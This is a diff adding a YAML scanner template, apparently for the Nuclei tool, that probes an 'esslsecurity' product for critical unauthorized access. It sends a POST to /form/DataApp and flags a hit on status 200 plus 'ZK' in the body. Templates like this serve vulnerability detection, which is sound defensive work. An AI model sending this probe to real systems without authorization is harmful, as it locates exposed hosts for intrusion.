@@ -1,0 +1,26 @@
+id: yaml-poc-esslsecurity-esslsecurity-unauthorized_access-CT-442594
+info:
+  name: Yaml Poc Esslsecurity Esslsecurity Unauthorized_Access Ct 442594
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-esslsecurity-esslsecurity-unauthorized_access-CT-442594'
+  tags: unauth
+  reference:
+  - https://nosec.org/home/detail/3032.html
+http:
+- method: POST
+  path:
+  - /form/DataApp
+  body: style=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - ZK
